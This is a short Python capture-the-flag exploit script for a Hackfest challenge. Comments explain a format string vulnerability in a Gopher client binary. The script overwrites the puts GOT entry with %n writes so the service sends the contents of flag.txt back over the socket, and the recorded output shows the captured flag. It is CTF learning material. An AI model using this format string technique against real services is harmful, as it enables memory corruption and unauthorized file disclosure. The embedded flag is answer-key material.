#hamdi
#!/usr/bin/env python
from struct import pack
from socket import *
import time
'''
it's a format string vulnerability in do_net function, the binary was nx but we couln't leak libc,
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
after digging in the binary we found the ssend_file function, which take a file name  as variable and send its content through the sock fd
best option was to overwrite puts GOT table puts(&buf) -> ssendfile(&buf) -> ssend_file(flag.txt).
Not so hard, thanks to Hackfest organizers
'''


def p(data):
	return pack("<I",data)

puts = 0x0804A2B0
read_flag = 0x0804891C

s = socket(AF_INET, SOCK_STREAM)
s.connect(('challenge.hackfest.tn', 5002))

lsb = read_flag & 0xffff
msb = read_flag >> 16

fmt = p(puts) 
fmt +=p(puts+2)
fmt +="%"+str(lsb-0x10)+"d%9$n"
fmt += "%"+str(msb-lsb+0x250)+"d%10$n"
print s.recv(20148)
s.send("1\n")
print s.recv(1024)
s.send(fmt)
print s.recv(2014)
s.send("1.1.1.1:2222\n")
print s.recv(1024)
s.send("1\n")
print s.recv(1024)
s.send("flag.txtt\x00")
print s.recv(1024)
s.send("1.1.1.1:2222\n")
print s.recv(1024)
print s.recv(2048)



'''
root@ubuntu:~#./fmt.py
Select an option:
1. Query Gopher Server
2. Quit

Enter the path of the resource to request

Enter the destination Gopher IP and Gopher Port (Format: <gopher_ip>:<gopher_port>)

Successfully requested gopher server
Select an option:
1. Query Gopher Server
2. Quit

Enter the path of the resource to request

Enter the destination Gopher IP and Gopher Port (Format: <gopher_ip>:<gopher_port>)

hackfest{w4s_%n_us3d_f0r_@nyth1n9_b3side5_th1$}
Successfully requested gopher server
Select an option:
1. Query Gopher Server
2. Quit
'''
